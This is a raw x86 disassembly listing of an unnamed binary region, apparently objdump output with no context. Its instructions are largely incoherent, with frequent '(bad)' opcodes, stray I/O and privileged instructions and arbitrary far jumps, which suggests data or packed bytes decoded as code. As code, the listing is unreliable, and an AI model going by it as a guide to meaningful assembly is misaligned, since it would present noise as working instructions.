  433562:	mov    eax,ds:0x70e940e7
  433567:	add    al,0x53
  433569:	ret    
  43356a:	arpl   WORD PTR [edi-0x3b],bx
  43356d:	inc    ecx
  43356e:	scas   al,BYTE PTR es:[edi]
  43356f:	icebp  
  433570:	clc    
  433571:	inc    esi
  433572:	xor    edx,esi
  433574:	adc    bl,BYTE PTR ds:0x6200b8ea
  43357a:	or     DWORD PTR [edi-0x7],esi
  43357d:	cs cmp bl,ch
  433580:	sub    eax,0x856dc829
  433585:	cld    
  433586:	mov    ch,0xcc
  433588:	inc    eax
  433589:	jmp    0xa5cec218
  43358e:	test   ecx,edx
  433590:	push   eax
  433591:	pushf  
  433592:	rcr    BYTE PTR [ebp-0x738e3adc],cl
  433598:	push   ebx
  433599:	sub    DWORD PTR [edi+0x54a1f8f8],0x70f35e
  4335a3:	adc    bh,BYTE PTR [ebp+0x76d3de34]
  4335a9:	clc    
  4335aa:	(bad)  
  4335ab:	sub    eax,0xadf4f9b6
  4335b0:	int3   
  4335b1:	inc    eax
  4335b2:	jmp    0xe965090b
  4335b7:	popa   
  4335b8:	ins    BYTE PTR es:[edi],dx
  4335b9:	xor    ah,BYTE PTR [edx+0x12]
  4335bc:	mov    ebp,0x6d296410
  4335c1:	sub    dl,BYTE PTR [ecx-0x6106fb3e]
  4335c7:	fucomi st,st(0)
  4335c9:	sbb    BYTE PTR [edi+0x3453d6aa],0xed
  4335d0:	pushf  
  4335d1:	and    al,0x0
  4335d3:	inc    ebx
  4335d4:	lods   al,BYTE PTR ds:[esi]
  4335d5:	div    DWORD PTR [edi+eiz*1-0x8]
  4335d9:	dec    esi
  4335da:	push   ebp
  4335db:	inc    esi
  4335dc:	test   DWORD PTR [esi],ecx
  4335de:	add    BYTE PTR [ebx],cl
  4335e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4335e1:	dec    edi
  4335e2:	call   FWORD PTR [eax+0x60]
  4335e5:	shl    BYTE PTR [edx+edx*1+0x61],0xc6
  4335ea:	call   0x3a3d1b
  4335ef:	adc    BYTE PTR [eax],0x4f
  4335f2:	call   DWORD PTR [esi]
  4335f4:	ror    BYTE PTR [esi],1
  4335f6:	inc    eax
  4335f7:	sti    
  4335f8:	pusha  
  4335f9:	mov    esi,0x53b6cd5f
  4335fe:	add    DWORD PTR [edi+0x1a51bbed],0xffffffa9
  433605:	dec    ebp
  433606:	push   esi
  433607:	add    BYTE PTR [edx+ecx*8],dl
  43360a:	shr    eax,0x1d
  43360d:	push   cs
  43360e:	idiv   edi
  433610:	dec    eax
  433611:	and    DWORD PTR [eax+edx*1],0x80051cb
  433618:	mov    ebx,0x42e883db
  43361d:	mov    cl,0x24
  43361f:	adc    al,0xd9
  433621:	xor    BYTE PTR [ebp-0x1f1298b4],al
  433627:	rcr    DWORD PTR [edi+0x2f8bf714],cl
  43362d:	rcl    DWORD PTR [eax],0x84
  433630:	retf   
  433631:	(bad)  
  433632:	sbb    eax,0x14c1478d
  433637:	push   eax
  433638:	push   esp
  433639:	add    DWORD PTR [eax],0x6a
  43363c:	pop    ebp
  43363d:	mov    al,0xf7
  43363f:	adc    eax,0x38eb1f
  433644:	ror    BYTE PTR [edx],1
  433646:	jnp    0x433646
  433648:	pop    esp
  433649:	mov    ss,WORD PTR [eax]
  43364b:	(bad)  
  43364c:	bound  eax,QWORD PTR [ebx+0x7d]
  43364f:	cmc    
  433650:	popa   
  433651:	ror    DWORD PTR [ecx],cl
  433653:	test   DWORD PTR [esi+0x18e4f124],ecx
  433659:	retf   
  43365a:	or     al,0x5a
  43365c:	fbstp  TBYTE PTR [esi+0x51]
  43365f:	pop    es
  433660:	jmp    0x74b1bbc
  433665:	sbb    ah,0x2d
  433668:	or     eax,0x13dc2f
  43366d:	call   0x3cbf:0xe9003cf2
  433674:	pop    edx
  433675:	xchg   edi,eax
  433676:	cmp    esi,DWORD PTR [esi]
  433678:	push   edi
  433679:	and    DWORD PTR [esi-0x78],ecx
  43367c:	in     al,dx
  43367d:	xchg   ebx,eax
  43367e:	mov    dh,0x2
  433680:	enter  0x3c56,0xfd
  433684:	(bad)  
  433685:	das    
  433686:	aaa    
  433687:	mov    dh,ch
  433689:	fnstcw WORD PTR [ecx-0x74cec7ae]
  43368f:	pop    ecx
  433690:	je     0x4336b8
  433692:	add    BYTE PTR [eax],dh
  433694:	stc    
  433695:	dec    edi
  433696:	sub    al,0xef
  433698:	aas    
  433699:	(bad)  
  43369a:	out    dx,al
  43369b:	add    cl,al
  43369d:	cs inc esp
  43369f:	std    
  4336a0:	(bad)  
  4336a1:	push   ss
  4336a2:	or     ah,ch
  4336a4:	rcl    DWORD PTR [ecx-0x5d7b2b01],1
  4336aa:	mov    ebx,?
  4336ac:	jg     0x433705
  4336ae:	cmp    BYTE PTR [eax+0x44],dl
  4336b1:	bound  eax,QWORD PTR [ecx]
  4336b3:	mov    esi,0x40b4a603
  4336b8:	add    BYTE PTR [edi+0x10],dl
  4336bb:	inc    edx
  4336bc:	add    BYTE PTR [ecx],dl
  4336be:	das    
  4336bf:	out    dx,eax
  4336c0:	aas    
  4336c1:	jo     0x433683
  4336c3:	add    al,0x55
  4336c5:	out    0xd8,eax
  4336c7:	sub    al,0xd8
  4336c9:	mov    dl,0x8f
  4336cb:	or     eax,0xaa25df04
  4336d0:	inc    ecx
  4336d1:	add    BYTE PTR [esi],bh
  4336d3:	test   eax,0x16203e7
  4336d8:	enter  0x2bd2,0xf6
  4336dc:	push   ss
  4336dd:	xor    ebp,DWORD PTR [ebx]
  4336df:	int3   
  4336e0:	outs   dx,DWORD PTR ds:[esi]
  4336e1:	icebp  
  4336e2:	pop    ebp
  4336e3:	fldenv [esp+eax*8-0x72]
  4336e7:	leave  
  4336e8:	iret   
  4336e9:	dec    edi
  4336ea:	rcr    DWORD PTR [eax-0x33f4ce19],0x67
  4336f1:	idiv   BYTE PTR ds:0xffc415d9
  4336f7:	fidiv  DWORD PTR [edi+0x5]
  4336fa:	mov    edx,DWORD PTR [edi+0x6291c730]
  433700:	inc    ebx
  433701:	xor    eax,0x501fdbd0
  433706:	push   ds
  433707:	fld1   
  433709:	xor    DWORD PTR [ebx],esi
  43370b:	bound  edx,QWORD PTR ds:0xcf6bcd8f
  433711:	div    DWORD PTR ss:[ebx+edx*4+0x3f]
  433716:	bound  ecx,QWORD PTR [edx-0x34e60efe]
  43371c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43371d:	add    esi,DWORD PTR [eax+0x26501fdb]
  433723:	fld1   
  433725:	push   eax
  433726:	ins    BYTE PTR es:[edi],dx
  433727:	add    DWORD PTR [edi+edx*8],edi
  43372a:	mov    esi,ebp
  43372c:	(bad)
  433731:	or     BYTE PTR [edx+0x4236c],ch
  433737:	jne    0x433757
  433739:	in     al,dx
  43373a:	(bad)  
  43373b:	neg    BYTE PTR [edi+eiz*8+0x9a55f0]
  433742:	jmp    0x295629db
  433747:	dec    esp
  433748:	mov    ch,0x0
  43374a:	inc    edx
  43374b:	fistp  DWORD PTR [eax+0x7b9039fc]
  433751:	add    BYTE PTR [edx+0x28],ah
  433754:	sbb    eax,DWORD PTR [ebx-0x73]
  433757:	push   ecx
  433758:	fld    DWORD PTR [eax]
  43375a:	jmp    0x7f358a98
  43375f:	or     BYTE PTR [edx-0x2eed89af],cl
  433765:	adc    ch,BYTE PTR [ecx]
  433767:	pop    esi
  433768:	pop    eax
  433769:	rcr    ch,0x11
  43376c:	jge    0x4337ea
  43376e:	test   BYTE PTR [ecx-0xda9ad27],ah
  433774:	pop    eax
  433775:	push   cs
  433776:	test   eax,0x52c0c361
  43377b:	addr16 sub edi,edi
  43377e:	popf   
  43377f:	sub    ebx,DWORD PTR [edi*4-0x37274c68]
  433786:	mov    ch,0x95
  433788:	fcos   
  43378a:	mov    ecx,0x72518792
  43378f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433790:	pop    esi
  433791:	out    dx,eax
  433792:	pushf  
  433793:	push   ebx
  433794:	cs jl  0x43372c
  433797:	jne    0x433772
  433799:	dec    ebp
  43379a:	push   es
  43379b:	add    BYTE PTR [edx+0x61a90ea0],dh
  4337a1:	out    0x2,eax
  4337a3:	and    DWORD PTR ds:0x32e8009d,ebp
  4337a9:	retf   
  4337aa:	call   0xf935ec6b
  4337af:	gs sahf 
  4337b1:	ins    DWORD PTR es:[edi],dx
  4337b2:	punpckhwd mm4,QWORD PTR [ebp+0x21]
  4337b6:	je     0x4337dd
  4337b8:	pop    esi
  4337b9:	hlt    
  4337ba:	rol    DWORD PTR [eax],0x7e
  4337bd:	sbb    al,0x74
  4337bf:	inc    esp
  4337c0:	jnp    0x4337c5
  4337c2:	or     DWORD PTR [ebx+0x4b],eax
  4337c5:	lods   eax,DWORD PTR ds:[esi]
  4337c6:	not    DWORD PTR ds:0x38eb8b
  4337cc:	shr    ah,1
  4337ce:	inc    eax
  4337cf:	push   ss
  4337d0:	jnp    0x4337af
  4337d2:	test   DWORD PTR [edi+ebp*1-0x18],eax
  4337d6:	dec    eax
  4337d7:	push   esi
  4337d8:	popa   
  4337d9:	frstor [edx+0x2]
  4337dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4337dd:	pop    ebp
  4337de:	add    BYTE PTR [eax],al
  4337e0:	cmp    ebp,DWORD PTR [ecx-0x2bd0937f]
  4337e6:	not    ebx
  4337e8:	jle    0x433807
  4337ea:	je     0x433812
  4337ec:	xchg   esi,eax
  4337ed:	cdq    
  4337ee:	and    al,0x10
  4337f0:	retf   
  4337f1:	test   eax,0xe9210062
  4337f6:	dec    edi
  4337f7:	mov    DWORD PTR [edi+0x48ff24d3],esi
  4337fd:	je     0x4337bf
  4337ff:	je     0x433801
  433801:	or     al,bl
  433803:	bound  eax,QWORD PTR [eax]
  433805:	std    
  433806:	adc    BYTE PTR ds:0x97ad64,cl
  43380c:	cmp    DWORD PTR [edi-0x1f],0x2a
  433810:	shl    BYTE PTR [eax-0x25],0xb0
  433814:	add    esp,esi
  433816:	mov    cl,0x55
  433818:	pop    ebx
  433819:	repnz sbb al,0x4b
  43381c:	push   ebp
  43381d:	int    0xa8
  43381f:	cmp    ecx,0x30
  433822:	xor    eax,DWORD PTR [edx-0x12939cf1]
  433828:	inc    DWORD PTR [esp+eiz*2-0x4a989518]
  43382f:	sub    esi,esi
  433831:	xor    ebp,ebp
  433833:	jnp    0x433832
  433835:	(bad)
  43383a:	test   eax,0xeb60fb83
  43383f:	cmp    al,dh
  433841:	or     al,0x88
  433843:	add    al,0x4d
  433845:	pop    ebp
  433846:	push   ss
  433847:	pop    ecx
  433848:	adc    ah,BYTE PTR [edx+0x5ec48400]
  43384e:	loop   0x4337d5
  433850:	and    eax,0x1a50c597
  433855:	loope  0x4338b4
  433857:	jmp    0x72e5:0xbd0e5e73
  43385e:	(bad)  
  43385f:	hlt    
  433860:	mov    bl,BYTE PTR [ebp+0x8b2d01]
  433866:	mov    eax,ds:0x6ff92cf8
  43386b:	in     al,0xee
  43386d:	aas    
  43386e:	bound  edi,QWORD PTR [edi-0x47]
  433871:	or     al,0xf9
  433873:	cli    
  433874:	mov    eax,DWORD PTR [ecx+0x63]
  433877:	jns    0x4338bd
  433879:	add    al,0x65
  43387b:	dec    edx
  43387c:	inc    eax
  43387d:	push   cs
  43387e:	test   BYTE PTR [edi+0x48],ah
  433881:	(bad)  
  433883:	rcr    esi,0x8
  433886:	inc    esp
  433887:	test   esp,0x337eb62
  43388d:	mov    al,0x63
  43388f:	sbb    esi,DWORD PTR [edi]
  433891:	pop    ebx
  433892:	sub    DWORD PTR [edi+0x2f16ec84],edi
  433898:	sub    dl,BYTE PTR [edx+0xd]
  43389b:	pop    eax
  43389c:	std    
  43389d:	pop    es
  43389e:	bound  eax,QWORD PTR [eax]
  4338a0:	adc    al,0xd5
  4338a2:	adc    ebx,esi
  4338a4:	or     cl,BYTE PTR [eax+0x1d]
  4338a7:	inc    esp
  4338a8:	std    
  4338a9:	test   BYTE PTR [eax-0x1783189],cl
  4338af:	fmul   DWORD PTR [ebx]
  4338b1:	adc    ch,bl
  4338b3:	ins    DWORD PTR es:[edi],dx
  4338b4:	add    edx,DWORD PTR [ebx+edi*2]
  4338b7:	int3   
  4338b8:	shl    esp,cl
  4338ba:	xor    eax,0xe1dc5ed9
  4338bf:	repnz cmp eax,DWORD PTR [edi]
  4338c2:	cld    
  4338c3:	loopne 0x43387f
  4338c5:	icebp  
  4338c6:	inc    ecx
  4338c7:	int3   
  4338c8:	daa    
  4338c9:	add    al,0x0
  4338cb:	test   BYTE PTR [ecx],bl
  4338cd:	shl    BYTE PTR [ebx-0x75190db3],0xa0
  4338d4:	loope  0x433946
  4338d6:	inc    eax
  4338d7:	xchg   ch,al
  4338d9:	pop    esi
  4338da:	inc    ecx
  4338db:	push   0x7f
  4338dd:	in     eax,0x8c
  4338df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4338e0:	mov    ebp,0xbd9e8abb
  4338e5:	idiv   DWORD PTR [eax+eax*4]
  4338e8:	pusha  
  4338e9:	adc    esp,DWORD PTR [eax]
  4338eb:	outs   dx,BYTE PTR ds:[esi]
  4338ec:	pusha  
  4338ed:	sbb    esp,DWORD PTR [eax]
  4338ef:	inc    edx
  4338f0:	pop    esp
  4338f1:	daa    
  4338f2:	push   eax
  4338f3:	pop    edi
  4338f4:	jg     0x4338dc
  4338f6:	cmp    al,0xe5
  4338f8:	pushf  
  4338f9:	or     edx,DWORD PTR [eax]
  4338fb:	frstor [ebx+eax*1+0xb6ceb24]
  433902:	ins    BYTE PTR es:[edi],dx
  433903:	fstp   DWORD PTR [ebx+eax*1-0x6776d0ec]
  43390a:	mov    esi,DWORD PTR [esi]
  43390c:	mov    ebp,0xd971d705
  433911:	test   BYTE PTR [ebx+0x62],0xb4
  433915:	in     eax,0x4
  433917:	(bad)  
  433918:	(bad)  
  43391a:	jg     0x43395b
  43391c:	fsub   st,st(7)
  43391e:	add    esp,ecx
  433920:	sbb    BYTE PTR [ebx-0x10],bh
  433923:	es icebp 
  433925:	out    0x6,eax
  433927:	loope  0x4338d6
  433929:	add    al,ch
  43392b:	popa   
  43392c:	fld    DWORD PTR [ebp-0x7b27ff0c]
  433932:	and    al,0xd
  433934:	fistp  DWORD PTR [esp-0x7423770c]
  43393b:	sub    eax,0x2587cd42
  433940:	inc    edx
  433941:	aad    0x8b
  433943:	sub    eax,0xbe50b142
  433948:	scas   eax,DWORD PTR es:[edi]
  433949:	loope  0x433944
  43394b:	aas    
  43394c:	(bad)  
  43394e:	adc    ch,cl
  433950:	aas    
  433951:	mov    cl,0x0
  433953:	ins    BYTE PTR es:[edi],dx
  433954:	and    ebx,esp
  433956:	adc    edi,0x66
  433959:	fld    DWORD PTR [eax]
  43395b:	lahf   
  43395c:	jne    0x433913
  43395e:	cmp    al,ch
  433960:	fs push ebp
  433962:	mov    al,ds:0x37d961e9
  433967:	sbb    eax,0x6c09ad42
  43396c:	data16 lock clc 
  43396f:	jmp    0xe9ac154c
  433974:	pop    ecx
  433975:	fld    DWORD PTR [eax]
  433977:	mov    dh,0xe8
  433979:	and    edi,ecx
  43397b:	mov    ecx,0x54457f5
  433980:	out    dx,al
  433981:	pop    ebx
  433982:	rol    cl,0x91
  433985:	push   esi
  433986:	push   esp
  433987:	add    eax,0x2894e236
  43398c:	jmp    0xe31d5e2e
  433991:	pop    ds
  433992:	je     0x433966
  433994:	add    al,bl
  433996:	out    dx,eax
  433997:	mov    ebp,DWORD PTR [ebp-0x41b02ea3]
  43399d:	jb     0x43392a
  43399f:	test   DWORD PTR [ebx],esp
  4339a1:	xchg   esp,eax
  4339a2:	mov    DWORD PTR [eax+eax*1],eax
  4339a5:	aaa    
  4339a6:	sbb    al,0x7
  4339a8:	test   BYTE PTR [ebp-0x24],ah
  4339ab:	add    BYTE PTR [eax],al
  4339ad:	shr    DWORD PTR [eax+0x59ac1324],cl
  4339b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4339b4:	add    BYTE PTR [ebx-0x24],bh
  4339b7:	add    DWORD PTR [edi+eiz*2-0x13],0x7d
  4339bc:	ror    BYTE PTR ds:0x704e3e6,0x24
  4339c3:	ins    DWORD PTR es:[edi],dx
  4339c4:	cs pushf 
  4339c6:	mov    DWORD PTR [esp+ebp*2],esp
  4339c9:	rcr    BYTE PTR [eax],1
  4339cb:	div    DWORD PTR [edi+eiz*2-0x7f]
  4339cf:	push   eax
  4339d0:	push   edi
  4339d1:	and    ecx,DWORD PTR [ebx+0x58fcfff8]
  4339d7:	ror    BYTE PTR [edi],0xc7
  4339da:	pusha  
  4339db:	add    BYTE PTR [eax],al
  4339dd:	dec    ebx
  4339de:	popa   
  4339df:	(bad)  
  4339e0:	addr16 cmp esp,esp
  4339e3:	add    BYTE PTR [eax],al
  4339e5:	inc    esp
  4339e6:	(bad)  
  4339e7:	(bad)  
  4339e8:	(bad)  
  4339e9:	jnp    0x4339c4
  4339eb:	add    DWORD PTR [edi+eiz*1-0xc],0x8012c07d
  4339f3:	jge    0x4339b5
  4339f5:	add    ch,bl
  4339f7:	not    DWORD PTR ds:0x39004f00
  4339fd:	add    BYTE PTR [esi-0x36],cl
  433a00:	pop    ds
  433a01:	add    bl,bh
  433a03:	aam    0x7d
  433a05:	mov    edi,ebx
  433a07:	fild   DWORD PTR [eax]
  433a09:	test   BYTE PTR [edi],0xd0
  433a0c:	cmp    BYTE PTR [eax],ah
  433a0e:	pop    ss
  433a0f:	mov    esp,0xa5675c31
  433a14:	ins    DWORD PTR es:[edi],dx
  433a15:	ins    BYTE PTR es:[edi],dx
  433a16:	push   eax
  433a17:	mov    DWORD PTR [esp+ebx*1],esp
  433a1a:	ret    
  433a1b:	in     eax,0x6d
  433a1d:	punpckldq mm3,DWORD PTR [esi+edi*8-0x8]
  433a22:	aaa    
  433a23:	not    bl
  433a25:	adc    edx,DWORD PTR [edx-0x18ffc2f4]
  433a2b:	ror    DWORD PTR [ecx+0x61],0x9c
  433a2f:	(bad)  
  433a30:	std    
  433a31:	jg     0x433a41
  433a33:	push   ss
  433a34:	jmp    0x7d424937
  433a39:	jl     0x433a81
  433a3b:	in     eax,0xfd
  433a3d:	jae    0x433a67
  433a3f:	pop    es
  433a40:	dec    ecx
  433a41:	and    al,0xfa
  433a43:	mov    WORD PTR [ecx],?
  433a45:	and    al,0x32
  433a47:	shl    DWORD PTR [ecx+edi*8],cl
  433a4a:	(bad)  
  433a4b:	aam    0x28
  433a4d:	stc    
  433a4e:	outs   dx,DWORD PTR ds:[esi]
  433a4f:	add    al,dh
  433a51:	aas    
  433a52:	(bad)  
  433a53:	std    
  433a54:	(bad)  
  433a55:	inc    BYTE PTR [ebp+0x1]
  433a58:	dec    ecx
  433a59:	xor    ch,cl
  433a5b:	fsub   QWORD PTR [eax]
  433a5d:	sub    BYTE PTR [eax],al
  433a5f:	jmp    0x3b675b30
  433a64:	lahf   
  433a65:	sar    ecx,cl
  433a67:	and    eax,0x7a24316a
  433a6c:	dec    ebx
  433a6d:	jb     0x433ad5
  433a6f:	pop    esp
  433a70:	retf   
  433a71:	xchg   ebp,eax
  433a72:	frstor [ecx+0x0]
  433a75:	std    
  433a76:	jl     0x433a82
  433a78:	add    eax,DWORD PTR [esp+eax*2]
  433a7b:	sbb    ecx,DWORD PTR [ebp+esi*8+0x18dc9684]
  433a82:	in     eax,0x50
  433a84:	jnp    0x433ab7
  433a86:	and    al,0x92
  433a88:	mov    eax,DWORD PTR [ecx]
  433a8a:	ret    0xd426
  433a8d:	out    dx,al
  433a8e:	dec    al
  433a90:	std    
  433a91:	xchg   edi,eax
  433a92:	dec    esp
  433a93:	test   DWORD PTR [eax],eax
  433a95:	std    
  433a96:	test   BYTE PTR [ebp-0x3522f027],dl
  433a9c:	out    dx,al
  433a9d:	sbb    DWORD PTR [esi-0x71],edi
  433aa0:	gs jmp 0x65ee:0x3c4ab30
  433aa8:	fldcw  WORD PTR [ebp+0x3f]
  433aab:	inc    esi
  433aac:	retf   
  433aad:	call   0x36bf:0x66923935
  433ab4:	sbb    ebx,ebx
  433ab6:	add    esi,DWORD PTR [ecx]
  433ab8:	(bad)
  433abd:	lahf   
  433abe:	ins    BYTE PTR es:[edi],dx
  433abf:	out    dx,al
  433ac0:	xchg   esp,eax
  433ac1:	out    0x36,eax
  433ac3:	add    BYTE PTR [eax],dl
  433ac5:	xor    esi,0x7e
  433ac8:	lea    edx,[ebx+0x5c582467]
  433ace:	daa    
  433acf:	cld    
  433ad0:	lahf   
  433ad1:	fs mov edx,0x2365ce5c
  433ad7:	add    al,0x4b
  433ad9:	(bad)  
  433ada:	fcomip st,st(5)
  433adc:	jge    0x433ab7
  433ade:	or     eax,0xe7d9ca04
  433ae3:	sti    
  433ae4:	sub    eax,0x51d2e780
  433ae9:	loope  0x433ac3
  433aeb:	inc    ebx
  433aec:	bound  edi,QWORD PTR [edx]
  433aee:	das    
  433aef:	push   ebx
  433af0:	sahf   
  433af1:	fldcw  WORD PTR [esp+eax*8-0x6f]
  433af5:	lds    ebp,FWORD PTR [edx-0x7]
  433af8:	stc    
  433af9:	(bad)  
  433afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433afb:	add    ebx,edi
  433afd:	mov    al,ds:0x176247da
  433b02:	in     al,dx
  433b03:	cmp    BYTE PTR [edi-0x6b],bh
  433b06:	out    0x3,eax
  433b08:	call   ebp
  433b0a:	sub    DWORD PTR [ecx],ecx
  433b0c:	xor    DWORD PTR [edx-0x5d],ebp
  433b0f:	add    edx,ebp
  433b11:	jg     0x433b13
  433b13:	or     DWORD PTR [ecx+ebx*8],ebp
  433b16:	push   eax
  433b17:	cs retf 
  433b19:	icebp  
  433b1a:	pop    gs
  433b1c:	popa   
  433b1d:	push   esp
  433b1e:	lock fs cwde 
  433b21:	fs or  al,0xbf
  433b24:	nop
  433b25:	leave  
  433b26:	cmp    bl,bh
  433b28:	add    BYTE PTR [ecx],ah
  433b2a:	fld    DWORD PTR [edi-0x20b7659]
  433b30:	mov    ecx,0xd53355bb
  433b35:	xor    al,0x95
  433b37:	add    BYTE PTR [eax+ebp*4+0x64],ah
  433b3b:	ss je  0x433b78
  433b3e:	std    
  433b3f:	mov    dh,0xcc
  433b41:	popa   
  433b42:	fld    DWORD PTR [eax]
  433b44:	sar    DWORD PTR [ebx-0x1d3104aa],0xa1
  433b4b:	in     al,dx
  433b4c:	sbb    BYTE PTR [ecx],dh
  433b4e:	leave  
  433b4f:	sub    al,0xdb
  433b51:	mov    eax,ds:0x522f87d9
  433b56:	pop    eax
  433b57:	shl    BYTE PTR ds:0x91ff295a,0x4f
  433b5e:	push   esi
  433b5f:	xor    edi,ebp
  433b61:	mov    WORD PTR [ebp+0x660b6c00],ss
  433b67:	or     dh,BYTE PTR [edi]
  433b69:	adc    ecx,ecx
  433b6b:	xchg   esp,eax
  433b6c:	(bad)  [ecx+0x39af85d9]
  433b72:	fucomp st(0)
  433b74:	jbe    0x433ba6
  433b76:	mov    esp,0x14350fc0
  433b7b:	mov    ebp,0x2d8a3bba
  433b80:	push   edi
  433b81:	rol    BYTE PTR [ecx-0x5d],1
  433b84:	test   eax,0x5ee10161
  433b89:	adc    dh,bl
  433b8b:	add    DWORD PTR [eax],0x0
  433b8e:	mov    eax,DWORD PTR [ebx+ebp*1-0x30943596]
  433b95:	xor    eax,DWORD PTR [edx+0x768dd410]
  433b9b:	pop    es
  433b9c:	sbb    eax,0x4e
  433b9f:	cmp    esi,DWORD PTR [edi+0xc]
  433ba2:	push   ebx
  433ba3:	ja     0xd3a490a6
  433ba9:	comiss xmm3,DWORD PTR [eax]
  433bac:	jecxz  0x433bc0
  433bae:	jae    0x433bcc
  433bb0:	xchg   ebp,edi
  433bb2:	xchg   esp,eax
  433bb3:	push   ebx
  433bb4:	shl    BYTE PTR [ebp+0x7c],0x10
  433bb8:	fimul  DWORD PTR [edi+0x6e30a76]
  433bbe:	fcmovnu st,st(0)
  433bc0:	test   al,al
  433bc2:	push   cs
  433bc3:	lock cmp DWORD PTR ds:[ecx+eiz*8-0x79860185],0xffffffb3
  433bcd:	pop    edi
  433bce:	enter  0xfa07,0x5d
  433bd2:	adc    BYTE PTR [ecx+0x5ab1e826],0xf5
  433bd9:	(bad)  
  433bda:	mov    edi,0x51257415
  433bdf:	aad    0x62
  433be1:	add    ecx,eax
  433be3:	inc    ecx
  433be4:	popf   
  433be5:	inc    eax
  433be6:	cmp    eax,ebp
  433be8:	shr    eax,0xf6
  433beb:	pop    ecx
  433bec:	cmc    
  433bed:	dec    DWORD PTR [edi+0xc7415]
  433bf3:	repz pop esp
  433bf5:	xchg   ebp,edi
  433bf7:	xchg   esp,eax
  433bf8:	popa   
  433bf9:	shl    BYTE PTR [eax+edi*8+0x47],0xf9
  433bfe:	ret    0x7e93
  433c01:	xchg   ebp,edi
  433c03:	xchg   esp,eax
  433c04:	ret    
  433c05:	rol    bl,0x62
  433c08:	jg     0x433bea
  433c0a:	sub    al,0x91
  433c0c:	and    eax,0x88e95137
  433c11:	xor    ecx,edi
  433c13:	outs   dx,DWORD PTR ds:[esi]
  433c14:	ds repz aas 
  433c17:	bound  esp,QWORD PTR [ecx+0x54]
  433c1a:	ins    BYTE PTR es:[edi],dx
  433c1b:	push   ds
  433c1c:	add    bh,BYTE PTR [edx+0x4c]
  433c1f:	xchg   dl,bl
  433c21:	sub    eax,0x7631ac2d
  433c26:	je     0x433bae
  433c28:	sbb    dh,BYTE PTR [esi+0x44]
  433c2b:	jle    0x433c2b
  433c2d:	iret   
  433c2e:	adc    ebp,esi
  433c30:	or     al,0x3d
  433c32:	add    cl,ch
  433c34:	mov    ecx,0x5916d581
  433c39:	jl     0x433c00
  433c3b:	jp     0x433c62
  433c3d:	call   0xc5a9ba3b
  433c42:	xor    DWORD PTR [ebp-0x7b],0x30
  433c46:	push   ecx
  433c47:	adc    DWORD PTR [edi+ecx*8-0x301dc18c],ebp
  433c4e:	adc    esi,esi
  433c50:	or     eax,0x18e1003d
  433c55:	(bad)  
  433c56:	jae    0x433c58
  433c58:	pop    ebx
  433c59:	ja     0x433c1b
  433c5b:	call   0xfa134fd6
  433c60:	dec    ecx
  433c61:	ret    0xf17b
  433c64:	out    0xbc,eax
  433c66:	sub    BYTE PTR [ebx+ebx*8],bl
  433c69:	int3   
  433c6a:	sub    BYTE PTR [ebx+ebx*8],bl
  433c6d:	mov    esp,0xa80a2028
  433c72:	push   ss
  433c73:	cli    
  433c74:	adc    eax,0xb68aebc7
  433c79:	sbb    al,0x15
  433c7b:	push   edi
  433c7c:	cli    
  433c7d:	out    dx,eax
  433c7e:	jne    0x433c7b
  433c80:	std    
  433c81:	fnstenv [edi+eax*2+0x3e]
  433c85:	mov    ch,0xb7
  433c87:	rcl    BYTE PTR [ecx-0x43],1
  433c8a:	cmc    
  433c8b:	inc    ebx
  433c8c:	bound  edx,QWORD PTR [edi+eiz*1+0x57]
  433c90:	gs pop esi
  433c92:	pop    ss
  433c93:	adc    al,0x9d
  433c95:	add    DWORD PTR [esi+0x3eeac8e8],edi
  433c9b:	stos   BYTE PTR es:[edi],al
  433c9c:	daa    
  433c9d:	jmp    0x433cc8
  433c9f:	fucomi st,st(4)
  433ca1:	mov    cl,0xe7
  433ca3:	add    ecx,edx
  433ca5:	mov    ebp,0x1abd05f
  433caa:	cmp    edx,ecx
  433cac:	stos   DWORD PTR es:[edi],eax
  433cad:	jmp    0x7c01:0xeb65d4fe
  433cb4:	test   al,0x1
  433cb6:	push   ss
  433cb7:	jmp    0xd0df2747
  433cbc:	add    BYTE PTR [ecx-0x67],dh
  433cbf:	aad    0x43
  433cc1:	bound  ecx,QWORD PTR [edx+0x560f3141]
  433cc7:	mov    ds:0xc356af20,eax
  433ccc:	in     al,dx
  433ccd:	adc    BYTE PTR [esi-0x40],bl
  433cd0:	cmp    DWORD PTR [ebx-0x3c],ebx
  433cd3:	xor    esi,edx
  433cd5:	xchg   ebp,eax
  433cd6:	fldcw  WORD PTR [esi+0x38]
  433cd9:	xchg   BYTE PTR [ebp-0x4681bfa2],dh
  433cdf:	mov    edi,0xa1eb74fa
  433ce4:	mov    BYTE PTR [edx],ah
  433ce6:	cmp    bh,BYTE PTR fs:[ebx-0x6a]
  433cea:	mov    ch,0xcb
  433cec:	jp     0x433c84
  433cee:	mov    ch,0xc7
  433cf0:	fstp   TBYTE PTR [ebp-0xe]
  433cf3:	or     bh,0xde
  433cf6:	sbb    ah,dh
  433cf8:	cmp    eax,0x950001b0
  433cfd:	inc    esi
  433cfe:	out    dx,eax
  433cff:	clc    
  433d00:	outs   dx,BYTE PTR ds:[esi]
  433d01:	call   0xd19:0xfb6624b5
  433d08:	test   eax,0x64227361
  433d0d:	sub    dh,BYTE PTR [ebp-0x16a74ff4]
  433d13:	out    0x26,eax
  433d15:	push   esi
  433d16:	out    dx,al
  433d17:	clc    
  433d18:	rcr    DWORD PTR [ebp+ebx*2+0x54620d54],cl
  433d1f:	retf   0x41
  433d22:	out    0xb4,eax
  433d24:	stc    
  433d25:	test   BYTE PTR es:[esi-0x40],dl
  433d29:	xchg   esp,eax
  433d2a:	test   al,0x54
  433d2c:	push   esp
  433d2d:	int    0x7d
  433d2f:	add    DWORD PTR [eax-0x52],edx
  433d32:	scas   eax,DWORD PTR es:[edi]
  433d33:	out    dx,eax
  433d34:	in     al,0xeb
  433d36:	jae    0x433d51
  433d38:	test   BYTE PTR [ecx],ch
  433d3a:	sub    ebx,esi
  433d3c:	test   DWORD PTR [ebp-0x627a4ac3],ebx
  433d42:	inc    ebp
  433d43:	mov    ecx,0xefe634e8
  433d48:	clc    
  433d49:	xor    al,0x9d
